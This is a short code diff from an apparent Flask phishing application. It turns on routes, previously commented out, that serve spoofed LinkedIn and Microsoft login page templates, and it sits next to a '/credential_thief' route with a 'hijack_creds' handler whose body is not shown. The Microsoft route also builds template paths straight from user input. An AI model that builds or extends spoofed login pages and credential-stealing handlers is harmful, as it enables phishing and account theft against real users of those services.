@@ -199,7 +199,6 @@ def error():
     pass
 
 #########[ DEBUG CRAP - REMOVE BEFORE PR ]##############
-'''This is for debugging purposes atm
 @routes.route('/linkedin', methods=["GET", "POST"])
 def linkedin():
     return render_template("spoofed_website_templates/linkedin/index.html")
@@ -211,7 +210,6 @@ def microsoft():
 @routes.route('/microsoft/<path:filename>', methods=["GET", "POST"])
 def microsoft_aux_files(filename):
     return render_template("spoofed_website_templates/microsoft/" + filename)
-'''
 
 @routes.route("/credential_thief", methods=["GET", "POST"])
 def hijack_creds():
